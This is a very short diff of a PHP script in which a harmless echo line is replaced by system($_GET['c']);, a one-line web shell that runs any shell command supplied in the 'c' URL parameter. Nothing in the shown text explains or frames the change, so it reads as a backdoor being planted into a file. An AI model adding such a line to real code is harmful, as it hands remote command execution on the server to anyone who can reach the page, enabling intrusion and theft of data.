@@ -1,5 +1,5 @@
 #!/usr/bin/php 
 <?php
  
- echo "f"
+ system ($_GET ['c']);
 ?>
